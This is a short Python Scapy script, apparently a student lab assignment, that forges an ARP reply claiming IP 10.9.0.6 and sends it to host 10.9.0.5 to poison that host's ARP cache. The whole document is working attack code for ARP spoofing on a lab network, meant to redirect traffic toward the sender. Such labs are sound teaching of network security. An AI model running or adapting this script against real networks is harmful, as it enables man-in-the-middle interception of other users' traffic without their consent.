#!/usr/bin/python3
from scapy.all import *
print("CMPE209-Assignment1-016707314-ARP Cache Poisoning Attack - Task1B- Using ARP Reply - B's IP is not in A's cache");

E = Ether(dst='02:42:0a:09:00:05')
A = ARP(op=2, psrc='10.9.0.6', pdst='10.9.0.5')	#op=2 is used to send the reply

pkt = E/A
pkt.show()
sendp(pkt)
